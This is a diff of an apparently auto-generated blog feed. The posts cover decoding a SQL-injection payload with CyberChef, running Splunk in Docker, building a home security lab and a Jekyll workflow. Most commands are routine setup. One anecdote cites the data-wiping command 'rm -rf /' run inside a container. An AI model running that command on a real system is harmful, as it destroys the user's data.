-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;This string of commands stops all running containers, removes the container images and then removes associated volumes. You can also just run the second one if you just want to delet all currently stopped containers.&lt;/p&gt;
 
@@ -394,14 +522,13 @@ docker volume ls -qf dangling=true | xargs -r docker volume rm
 
 &lt;p&gt;First you need to install CyberChef locally. I understand any concerns about installing something from GCHQ, but if you’re worried, do it in a VM and restore a snapshot when youre done. If you’re really really worried, maybe reevaluate what you’re doing on your computer. To install on Ubuntu 16.04, fully updated as of Dec 2016,&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install git nodejs npm
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install git nodejs npm
 npm install -g grunt-cli
 git clone https://github.com/gchq/CyberChef.git
 cd CyberChef
 npm install
 docker run -dit -p 8888:80 -v /home/ubuntu/gits/CyberChef/:/usr/local/apache2/htdocs httpd
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;Not really sure what changed here, but on 4/14/17 when I set this up again, I had to be in the Cyberchef directory and run “sudo grunt prod” before it would populate the prod directory.&lt;/p&gt;
@@ -411,19 +538,19 @@ docker run -dit -p 8888:80 -v /home/ubuntu/gits/CyberChef/:/usr/local/apache2/ht
 
 &lt;p&gt;We’re looking at this as though our IDS alert or packet capture of malicious traffic came to our desk for analysis. First, let’s clean up the code a little bit using Generic Code Beautify and URL Decode.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/images/cyberchefdeob1.PNG&quot; alt=&quot;Debofus 1&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/cyberchefdeob1.PNG&quot; alt=&quot;Debofus 1&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;So that’s a bit clearer, let’s decode the hex.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/images/cyberchefdeob2.PNG&quot; alt=&quot;Deobfus2&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/cyberchefdeob2.PNG&quot; alt=&quot;Deobfus2&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Well that broke the rest of the syntax, but that’s why we take notes right? As I’m decoding something like this, I create a step by step log of what I’ve changed so I can retrace why what I did worked.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/images/cyberchefdeobnotes.PNG&quot; alt=&quot;Deobfus Notes&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/cyberchefdeobnotes.PNG&quot; alt=&quot;Deobfus Notes&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;If we decode the final string, we see the malicious URL that was being injected into the database. I had to run two hex decodes before it decoded everything, but depending on how packed the payload is, you may have to run any number of operations.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/images/cyberchefdeob3.PNG&quot; alt=&quot;Deobfus3&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/cyberchefdeob3.PNG&quot; alt=&quot;Deobfus3&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;There is a Flow Control section in CyberChef that I think might help eliminate the need to take notes as you go and do it all in one operation, but I haven’t figured it out. If anyone reading this knows how to maek that happen, I’d love to hear it.&lt;/p&gt;
 
@@ -431,7 +558,7 @@ docker run -dit -p 8888:80 -v /home/ubuntu/gits/CyberChef/:/usr/local/apache2/ht
 
 &lt;p&gt;Now that we have our malicious payload decoded, we can determine our next moves. Since this began as SQL injection, let’s see if this string is anywhere in the database. If this infected an internal site, we probably need to figure out what that URL does, how we can update IDS/IPS signatures to help with that, and examine DNS and firewall records for any evidence of users or systems visiting that URL. If it’s customer facing, it’s probably time to work with the lawyers and find out what this means.&lt;/p&gt;
 
-&lt;p&gt;Of course, there’s tons of ways to do this. You could actually do all of what I did with notepad++ add ons, you could do it with command line decoders, or you could do it all manually. CyberChef is one tool that might not work all the time, but looks like it has a lot of potential.&lt;/p&gt;</content><summary type="html">More test cases, but first, some housekeeping</summary></entry><entry><title type="html">Practical Docker for Security Admins - Part 1</title><link href="http://0.0.0.0:4000/lab/homelab/budget/testing/2016/12/20/practical-docker.html" rel="alternate" type="text/html" title="Practical Docker for Security Admins - Part 1" /><published>2016-12-20T16:29:15-06:00</published><updated>2016-12-20T16:29:15-06:00</updated><id>http://0.0.0.0:4000/lab/homelab/budget/testing/2016/12/20/practical-docker</id><content type="html" xml:base="http://0.0.0.0:4000/lab/homelab/budget/testing/2016/12/20/practical-docker.html">&lt;p&gt;&lt;a href=&quot;https://www.docker.com/&quot;&gt;Docker&lt;/a&gt; and containers are pretty nifty.  You can run applications or even OSes inside containers (sort of, it shares a kernel with the host OS and there’s still at least some ways to escape a container to get to the host). The beauty of it to me is how throwaway it is. I saw a presentation where someone started an Ubuntu container, rm -rf /’ed themselves, created a new container, and it was like nothing ever happened. Amazing stuff.&lt;/p&gt;
+&lt;p&gt;Of course, there’s tons of ways to do this. You could actually do all of what I did with notepad++ add ons, you could do it with command line decoders, or you could do it all manually. CyberChef is one tool that might not work all the time, but looks like it has a lot of potential.&lt;/p&gt;</content><author><name></name></author><summary type="html">More test cases, but first, some housekeeping</summary></entry><entry><title type="html">Practical Docker for Security Admins - Part 1</title><link href="http://localhost:4000/lab/homelab/budget/testing/2016/12/20/practical-docker.html" rel="alternate" type="text/html" title="Practical Docker for Security Admins - Part 1" /><published>2016-12-20T16:29:15-06:00</published><updated>2016-12-20T16:29:15-06:00</updated><id>http://localhost:4000/lab/homelab/budget/testing/2016/12/20/practical-docker</id><content type="html" xml:base="http://localhost:4000/lab/homelab/budget/testing/2016/12/20/practical-docker.html">&lt;p&gt;&lt;a href=&quot;https://www.docker.com/&quot;&gt;Docker&lt;/a&gt; and containers are pretty nifty.  You can run applications or even OSes inside containers (sort of, it shares a kernel with the host OS and there’s still at least some ways to escape a container to get to the host). The beauty of it to me is how throwaway it is. I saw a presentation where someone started an Ubuntu container, rm -rf /’ed themselves, created a new container, and it was like nothing ever happened. Amazing stuff.&lt;/p&gt;
 
 &lt;p&gt;I won’t pretend I’m getting the most possible out of docker or even understand it fully, but the learning curve required to get a whole lot of functionality out of it is really shallow. I have Docker installed in a VM. Like I described earlier, I got it working well enough and then snapshotted it. If you’re not paying attention to what you’re doing, you can run into a lot of errors and annoyances you don’t see coming.&lt;/p&gt;
 
@@ -455,16 +582,14 @@ docker run -dit -p 8888:80 -v /home/ubuntu/gits/CyberChef/:/usr/local/apache2/ht
   &lt;li&gt;
     &lt;p&gt;Install necessary packages&lt;/p&gt;
 
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install docker.io linux-image-extra-&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;uname -r&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt; linux-image-extra-virtual git
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get install docker.io linux-image-extra-&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;uname &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt; linux-image-extra-virtual git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
   &lt;li&gt;
     &lt;p&gt;Add yourself to the appropriate group&lt;/p&gt;
 
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo usermod -aG docker &lt;span class=&quot;nv&quot;&gt;$USER&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;usermod &lt;span class=&quot;nt&quot;&gt;-aG&lt;/span&gt; docker &lt;span class=&quot;nv&quot;&gt;$USER&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
   &lt;li&gt;
     &lt;p&gt;Reboot to make sure everything sticks and force you to log back in so group permissions take&lt;/p&gt;
@@ -472,10 +597,9 @@ docker run -dit -p 8888:80 -v /home/ubuntu/gits/CyberChef/:/usr/local/apache2/ht
   &lt;li&gt;
     &lt;p&gt;Log back in and enable the service&lt;/p&gt;
 
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systemctl start docker
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systemctl start docker
 systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;docker
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
 &lt;/ol&gt;
 
@@ -483,40 +607,38 @@ systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;docker
 
 &lt;p&gt;Splunk is great Running it in a docker container is greater. I tend to run cheap with VMs and not provision huge drives or anything, so it’s important for me to run them lean. Since my VMs are small and disk space is at a premium, the default minimum free space setting splunk has before it stops indexing of 5GB is pretty greedy for my tastes. I changed up the Dockerfile on the &lt;a href=&quot;https://github.com/splunk/docker-splunk&quot;&gt;official Splunk repo&lt;/a&gt; to require a minimum of 500MB free in my &lt;a href=&quot;https://github.com/remotephone/docker-splunk&quot;&gt;forked version&lt;/a&gt;. I literally changed only one line, so you can just clone the original repo and edit it yourself or just fork mine. The change was on line 42 and 43 of docker-splunk/enterprise/Dockerfile.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;42 &amp;amp;&amp;amp; rm -rf /var/lib/apt/lists/* \
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;42 &amp;amp;&amp;amp; rm -rf /var/lib/apt/lists/* \
 43 &amp;amp;&amp;amp; sed -i -e 's/minFreeSpace = 5000/minFreeSpace = 500/' /var/opt/splunk/etc/system/default/server.conf
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Replacing the server.conf minFreeSpace variable means indexing will keep running until you have only 500mb free, which is easier to swing than 5GB. If you need to change it further, you can, but at that point its probably better just to make a bigger disk.&lt;/p&gt;
 
 &lt;p&gt;For this example, I’ve created a /data directory and copied my VM’s /var/log/ directory into it just so we have some data to work with. To run the image, clone the repo, cd into the enterprise directory and do:&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker build -t splunkminfree .
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker build &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; splunkminfree &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 &amp;lt;&lt;span class=&quot;nb&quot;&gt;let &lt;/span&gt;it run and build&amp;gt;
-docker run -d -e &lt;span class=&quot;s2&quot;&gt;&quot;SPLUNK_START_ARGS=--accept-license&quot;&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;SPLUNK_USER=root&quot;&lt;/span&gt; -p &lt;span class=&quot;s2&quot;&gt;&quot;8000:8000&quot;&lt;/span&gt;  -v /data:/root/ splunkminfree
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+docker run &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SPLUNK_START_ARGS=--accept-license&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SPLUNK_USER=root&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;8000:8000&quot;&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /data:/root/ splunkminfree
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;If you watch the build happen, you can see where docker replaced the config file as it was building the image.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/images/splunksed.png&quot; alt=&quot;Splunk Sed Disk Size&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/splunksed.png&quot; alt=&quot;Splunk Sed Disk Size&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;If you did it right, you’ll have a container available at your VM IP on port 8000. It takes a minute or two to start up and you may have to enable port forwarding if your VM is NATed and not bridged. Once you update the default password, you’re at the start screen!&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/images/splunkstart.png&quot; alt=&quot;Splunk Start Screen&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/splunkstart.png&quot; alt=&quot;Splunk Start Screen&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;If we check our settings page, we can see our sed we did in the Dockerfile took place before execution, so we don’t need to restart the Splunk service, it booted up with our changes in place. This is important because if you do your changes as part of the entrypoint.sh script or elsewhere that’s not in the Dockerfile, your container can start up services before changes are made, making you restart them to get where you wanted to be to begin with.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/images/splunksettings.png&quot; alt=&quot;Splunk Settings&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/splunksettings.png&quot; alt=&quot;Splunk Settings&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;So now we have a working splunk instance, it loaded data at /data, and we can search it. You can change the destination mount directory to whatever you want, but since I sent it to the root user’s home folder, I need to find it  there.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/images/splunkdatadirs.png&quot; alt=&quot;Splunk Settings&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/splunkdatadirs.png&quot; alt=&quot;Splunk Settings&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Indexing will take a little bit depending on how much data you have, but there it is! You can now do all the wonderful things you can usually do in Splunk.&lt;/p&gt;
 
-&lt;p&gt;I think that’s all I want to go over for now. I’ll do a part 2 on this soon and go over Cyberchef.&lt;/p&gt;</content><summary type="html">Docker and containers are pretty nifty.  You can run applications or even OSes inside containers (sort of, it shares a kernel with the host OS and there’s still at least some ways to escape a container to get to the host). The beauty of it to me is how throwaway it is. I saw a presentation where someone started an Ubuntu container, rm -rf /’ed themselves, created a new container, and it was like nothing ever happened. Amazing stuff.</summary></entry><entry><title type="html">Security Labs on a (no) budget</title><link href="http://0.0.0.0:4000/lab/homelab/budget/testing/2016/12/20/Lab_on_a_budget.html" rel="alternate" type="text/html" title="Security Labs on a (no) budget" /><published>2016-12-20T16:29:15-06:00</published><updated>2016-12-20T16:29:15-06:00</updated><id>http://0.0.0.0:4000/lab/homelab/budget/testing/2016/12/20/Lab_on_a_budget</id><content type="html" xml:base="http://0.0.0.0:4000/lab/homelab/budget/testing/2016/12/20/Lab_on_a_budget.html">&lt;h2 id=&quot;so-you-want-a-lab&quot;&gt;So you want a lab?&lt;/h2&gt;
+&lt;p&gt;I think that’s all I want to go over for now. I’ll do a part 2 on this soon and go over Cyberchef.&lt;/p&gt;</content><author><name></name></author><summary type="html">Docker and containers are pretty nifty. You can run applications or even OSes inside containers (sort of, it shares a kernel with the host OS and there’s still at least some ways to escape a container to get to the host). The beauty of it to me is how throwaway it is. I saw a presentation where someone started an Ubuntu container, rm -rf /’ed themselves, created a new container, and it was like nothing ever happened. Amazing stuff.</summary></entry><entry><title type="html">Security Labs on a (no) budget</title><link href="http://localhost:4000/lab/homelab/budget/testing/2016/12/20/Lab_on_a_budget.html" rel="alternate" type="text/html" title="Security Labs on a (no) budget" /><published>2016-12-20T16:29:15-06:00</published><updated>2016-12-20T16:29:15-06:00</updated><id>http://localhost:4000/lab/homelab/budget/testing/2016/12/20/Lab_on_a_budget</id><content type="html" xml:base="http://localhost:4000/lab/homelab/budget/testing/2016/12/20/Lab_on_a_budget.html">&lt;h2 id=&quot;so-you-want-a-lab&quot;&gt;So you want a lab?&lt;/h2&gt;
 
 &lt;p&gt;It’s going to cost money. You can’t do this for free. Luckily, you’ve probably spent most of it already. I do everything I need to do on my desktop which does triple duty as a workstation and gaming machine. You don’t need as much storage as I have, but it comes in handy.&lt;/p&gt;
 
@@ -542,7 +664,7 @@ docker run -d -e &lt;span class=&quot;s2&quot;&gt;&quot;SPLUNK_START_ARGS=--acce
 
 &lt;p&gt;I’m not a fancy man, so I don’t pay for things if I can avoid it. I highly recommend Virtualbox for most of your virtualization. There’s some machines I’ve gotten (for the OSCP for example) that require VMWare Player, but the free copy does well enough for those 1 offs. Virtualbox supports snapshotting for free which makes a world of difference if you need to turn your computer off or want to quickly wipe a workstation to defaults.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/images/vboxconsole.png&quot; alt=&quot;VBox Console&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/vboxconsole.png&quot; alt=&quot;VBox Console&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;oses-and-where-to-get-them&quot;&gt;OSes and where to get them&lt;/h3&gt;
 
@@ -564,7 +686,7 @@ docker run -d -e &lt;span class=&quot;s2&quot;&gt;&quot;SPLUNK_START_ARGS=--acce
 
 &lt;p&gt;I use notedpad ++ a lot. This is a screenshot of me figuring out some Jekyll stuff. It’s real jot it down as I go kinda stuff, but it works. I want to write another article about notepad++ and other tools because I really think it’s one of the most useful things out there.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/images/notepadnotes.png&quot; alt=&quot;notepadnotes&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/notepadnotes.png&quot; alt=&quot;notepadnotes&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;It might look like scratch, but this is what I go back to when I redocument what I’m doing later.&lt;/p&gt;
 
@@ -578,7 +700,7 @@ docker run -d -e &lt;span class=&quot;s2&quot;&gt;&quot;SPLUNK_START_ARGS=--acce
   &lt;li&gt;&lt;a href=&quot;https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2012-r2&quot;&gt;Microsoft Technet Evaluation Center&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/&quot;&gt;Windows IE VMs for Developers&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://pcpartpicker.com/&quot;&gt;PC Part Picker&lt;/a&gt; In case you need stuff&lt;/li&gt;
-&lt;/ul&gt;</content><summary type="html">So you want a lab?</summary></entry><entry><title type="html">Maintaining a Productive Workflow</title><link href="http://0.0.0.0:4000/how-to/workflow/2016/12/19/Workflow.html" rel="alternate" type="text/html" title="Maintaining a Productive Workflow" /><published>2016-12-19T17:05:15-06:00</published><updated>2016-12-19T17:05:15-06:00</updated><id>http://0.0.0.0:4000/how-to/workflow/2016/12/19/Workflow</id><content type="html" xml:base="http://0.0.0.0:4000/how-to/workflow/2016/12/19/Workflow.html">&lt;p&gt;I work much better with a simple standardized work flow. If you followed my post on Installing Jekyll and getting ready, you’re ready to just use my workflow if you like it. Otherwise, tweak where necessary.&lt;/p&gt;
+&lt;/ul&gt;</content><author><name></name></author><summary type="html">So you want a lab?</summary></entry><entry><title type="html">Maintaining a Productive Workflow</title><link href="http://localhost:4000/how-to/workflow/2016/12/19/Workflow.html" rel="alternate" type="text/html" title="Maintaining a Productive Workflow" /><published>2016-12-19T17:05:15-06:00</published><updated>2016-12-19T17:05:15-06:00</updated><id>http://localhost:4000/how-to/workflow/2016/12/19/Workflow</id><content type="html" xml:base="http://localhost:4000/how-to/workflow/2016/12/19/Workflow.html">&lt;p&gt;I work much better with a simple standardized work flow. If you followed my post on Installing Jekyll and getting ready, you’re ready to just use my workflow if you like it. Otherwise, tweak where necessary.&lt;/p&gt;
 
 &lt;p&gt;This workflow assumes you have a local (ubuntu maybe\?) environment for development, use vim to edit text, git on the command line to push most updates, occassionally change things on the github console, have an SSH key set up to authenticate you, and don’t mind being methodical about it.&lt;/p&gt;
 
@@ -617,7 +739,7 @@ docker run -d -e &lt;span class=&quot;s2&quot;&gt;&quot;SPLUNK_START_ARGS=--acce
   &lt;li&gt;Stand on the shoulders of giants. Copy that template, reuse that syntax, google that stackoverflow. Other people have solved these problems, so use their knowledge. Just pay attention to when a fix you want to apply breaks something you’re doing or follows a pattern you don’t use.&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;I work with a dual monitor set up both at home and at work. I don’t know how people get along with single monitors unless they’re ultrawide. Invest in a second monitor, it’s worth it.&lt;/p&gt;</content><summary type="html">I work much better with a simple standardized work flow. If you followed my post on Installing Jekyll and getting ready, you’re ready to just use my workflow if you like it. Otherwise, tweak where necessary.</summary></entry><entry><title type="html">Installing Jekyll for Security Professionals - or “I don’t know what I’m doing”</title><link href="http://0.0.0.0:4000/2016/12/19/Installing_Jekyll_For_Security_Admins.html" rel="alternate" type="text/html" title="Installing Jekyll for Security Professionals - or &quot;I don't know what I'm doing&quot;" /><published>2016-12-19T17:05:15-06:00</published><updated>2016-12-19T17:05:15-06:00</updated><id>http://0.0.0.0:4000/2016/12/19/Installing_Jekyll_For_Security_Admins</id><content type="html" xml:base="http://0.0.0.0:4000/2016/12/19/Installing_Jekyll_For_Security_Admins.html">&lt;h2 id=&quot;why-are-we-here-anyway&quot;&gt;Why are we here anyway?&lt;/h2&gt;
+&lt;p&gt;I work with a dual monitor set up both at home and at work. I don’t know how people get along with single monitors unless they’re ultrawide. Invest in a second monitor, it’s worth it.&lt;/p&gt;</content><author><name></name></author><summary type="html">I work much better with a simple standardized work flow. If you followed my post on Installing Jekyll and getting ready, you’re ready to just use my workflow if you like it. Otherwise, tweak where necessary.</summary></entry><entry><title type="html">Installing Jekyll for Security Professionals - or “I don’t know what I’m doing”</title><link href="http://localhost:4000/2016/12/19/Installing_Jekyll_For_Security_Admins.html" rel="alternate" type="text/html" title="Installing Jekyll for Security Professionals - or &quot;I don't know what I'm doing&quot;" /><published>2016-12-19T17:05:15-06:00</published><updated>2016-12-19T17:05:15-06:00</updated><id>http://localhost:4000/2016/12/19/Installing_Jekyll_For_Security_Admins</id><content type="html" xml:base="http://localhost:4000/2016/12/19/Installing_Jekyll_For_Security_Admins.html">&lt;h2 id=&quot;why-are-we-here-anyway&quot;&gt;Why are we here anyway?&lt;/h2&gt;
 
 &lt;p&gt;Jekyll lets you create static pages easily. I’m a security person, not a website admin and I really didn’t want to spend the time learn while also generating content for the site. Maybe one day I’ll move this to something more formal, but this really seems to do well enough for now.&lt;/p&gt;
 
@@ -637,9 +759,8 @@ docker run -d -e &lt;span class=&quot;s2&quot;&gt;&quot;SPLUNK_START_ARGS=--acce
 
 &lt;p&gt;There are a few things you need to do. I don’t do this stuff on my desktop, I use a VM (even working in an Ubuntu variant), clone the repository there, do my work, and then throw away the VM or restore a snapshot. It means I have to manually add SSH keys to my github account each time depending on where I’m working from, but you can make this easy with the following:&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -u &lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt; --data &lt;span class=&quot;s1&quot;&gt;'{&quot;title&quot;:&quot;KEYNAME&quot;,&quot;key&quot;:&quot;ssh-rsa AAA...&quot;}'&lt;/span&gt; https://api.github.com/user/keys 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{&quot;title&quot;:&quot;KEYNAME&quot;,&quot;key&quot;:&quot;ssh-rsa AAA...&quot;}'&lt;/span&gt; https://api.github.com/user/keys 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Since I’m in the web console anyway, it’s easy to delete unneeded keys. You’ll also have to edit your ssh config file but you can avoid all that work if you just do it from your desktop. I’d rather not for reasons I’m still working out.&lt;/p&gt;
 
@@ -660,18 +781,16 @@ kyll-as-a-static-site-generator-with-github-pages/&quot;&gt;github documentation
       &lt;li&gt;
         &lt;p&gt;Run the following:&lt;/p&gt;
 
-        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install ruby ruby-dev make gcc git
-sudo gem install bundle
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
+        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get install ruby ruby-dev make gcc git
+&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;gem install bundle
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
       &lt;/li&gt;
       &lt;li&gt;
         &lt;p&gt;I also turn on a color scheme in VIM (shine until it fails me) and enable spellchecking. Add this to your ~/.vimrc file&lt;/p&gt;
 
-        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;spell &lt;span class=&quot;nv&quot;&gt;spelllang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;en_us
+        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;spell &lt;span class=&quot;nv&quot;&gt;spelllang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;en_us
  colorscheme shine
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
       &lt;/li&gt;
       &lt;li&gt;
         &lt;p&gt;I keep a directory of repositories in my home directory to minimize clutter called gits and do all my work out of there&lt;/p&gt;
@@ -711,34 +830,31 @@ sudo gem install bundle
       &lt;li&gt;
         &lt;p&gt;Before you commit, you need to run&lt;/p&gt;
 
-        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git config --global user.email &lt;span class=&quot;s2&quot;&gt;&quot;you@example.com&quot;&lt;/span&gt;
- 	  git config --global user.name &lt;span class=&quot;s2&quot;&gt;&quot;Your Name&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-        &lt;/div&gt;
